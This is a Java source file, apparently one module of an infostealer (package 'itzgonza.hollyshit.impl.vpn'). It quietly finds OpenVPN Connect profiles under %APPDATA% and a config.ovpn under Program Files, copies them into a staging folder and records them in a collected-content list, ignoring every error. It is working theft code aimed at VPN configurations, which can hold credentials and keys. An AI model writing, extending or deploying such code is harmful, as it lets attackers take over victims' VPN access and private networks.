package itzgonza.hollyshit.impl.vpn;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;

import org.apache.commons.io.FileUtils;

import itzgonza.hollyshit.utils.utilities;

public class OpenVPN extends utilities {

    public void initialize() throws Exception {
        String profilesPath = System.getenv("APPDATA") + "/OpenVPN Connect/profiles";
        File profilesDir = new File(profilesPath);
        
        if (profilesDir.exists()) {
            Files.list(Paths.get(profilesPath))
                .filter(path -> path.toString().endsWith(".ovpn"))
                .forEach(path -> {
                    try {
                        File destFile = new File(getFolder() + "/vpn/open/" + path.getFileName().toString());
                        destFile.getParentFile().mkdirs();
                        FileUtils.copyFile(path.toFile(), destFile);
                        content.add("open_vpn");
                    } catch (Exception ignored) {}
                });
        }
        
        // Also check for config.ovpn in Program Files
        File programFilesConfig = new File("C:\\Program Files\\OpenVPN\\config\\config.ovpn");
        if (programFilesConfig.exists()) {
            File destFile = new File(getFolder() + "/vpn/open/config.ovpn");
            destFile.getParentFile().mkdirs();
            FileUtils.copyFile(programFilesConfig, destFile);
            content.add("open_vpn");
        }
    }
}